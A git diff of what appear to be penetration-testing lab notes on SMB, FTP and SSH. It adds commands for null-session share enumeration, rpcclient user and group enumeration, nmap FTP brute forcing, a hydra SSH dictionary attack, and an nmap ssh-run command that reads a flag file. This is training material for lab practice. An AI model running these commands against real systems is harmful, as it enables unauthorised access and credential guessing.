@@ -215,6 +215,7 @@ nmap -p445 --script smb-enum-services --script-args smbusername=administrator,sm
 #### SMBmap
 enumerate
 ```bash
+#enumerate to see share access
 smbmap -u guest -p "" -d . -H 10.4.26.58
 smbmap -u administrator -p smbserver_771 -d . -H 10.4.26.58
 ```
@@ -239,7 +240,7 @@ Some tools choose 1 get good
 #Tool to enumerate groups, see which we can connect to (<20> means can connect with client) :
 nmblookup -A 192.223.132.3
 
-#check if there is a IPC null session
+#List available shares to connect to (w/o authenticating) / Also gives the samba server description in the comments
 smbclient -L 192.223.132.3 -N
 
 #Connect with emoty user name and no pass
@@ -247,7 +248,7 @@ rpcclient -U "" -N 192.223.132.3
 
 #another tool to ind the OS, users and bunch of other stuff
 enum4linux -o 192.76.243.3
-enum4linux -u 192.76.243.3
+enum4linux -U 192.76.243.3
 
 #find if it uses smb2 using metasploit (useful info for later??)
 auxiliary/scanner/smb/smb2
@@ -262,6 +263,30 @@ smbclient //192.4.17.3/jane -U jane
 smbclient //192.4.17.3/admin -U admin
 #then enter password found
 ```
+
+useful rpcclient commands
+```rpcclient
+      SRVSVC
+        srvinfo         Server query info
+   netshareenum         Enumerate shares
+netshareenumall         Enumerate enumall shares
+netsharegetinfo         Get Share Info
+netsharesetinfo         Set Share Info
+
+ 
+   querydominfo         Query domain info
+   enumdomusers         Enumerate domain users
+  enumdomgroups         Enumerate domain groups
+  enumalsgroups         Enumerate alias groups
+    enumdomains         Enumerate domains
+  createdomuser         Create domain user
+ createdomgroup         Create domain group
+ createdomalias         Create domain alias
+    
+#to get sid of a user
+lookupnames admin
+```
+
 Cracking to enter without auth:
  metasploit
  ```bash
@@ -292,6 +317,7 @@ note: flag.tar.gz
 use: "tar -xf flag.tar.gz" to unzip
 
 ## FTP
+Common versions : ProFTP / VSFTPD
 port: 21 
 Connect
 ```bash
@@ -309,6 +335,9 @@ echo "sysadmin" > users
 cat users
 #should show "sysadmin" in there
 nmap 192.213.157.3 --script ftp-brute --script-args userdb=/root/users -p 21
+
+#no known users
+nmap 192.155.248.3 --script ftp-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/common_users.txt,passdb=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -p21
 ```
 
 Easy Targets of FTP:
@@ -324,6 +353,9 @@ First determine if its windows or linux, linux always has root@192.12.11.2
 Connect
 ```bash
 ssh root@192.244.123.3
+
+#run commands in ssh using nmap scripts
+nmap 192.158.121.3 -p22 --script ssh-run --script-args ssh-run.username=student,ssh-run.password="",ssh-run.cmd="cat FLAG"
 ```
 Some enums
 ```bash
@@ -344,7 +376,7 @@ nmap 192.244.123.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin
 
 hydra dictionary attack
 ```bash
-hydra -l student -P usr/share/wordlists/rockyou.txt 192.244.123.3 ssh
+hydra -l student -P /usr/share/wordlists/rockyou.txt 192.244.123.3 ssh
 ```
 nmap script attack
 ```bash
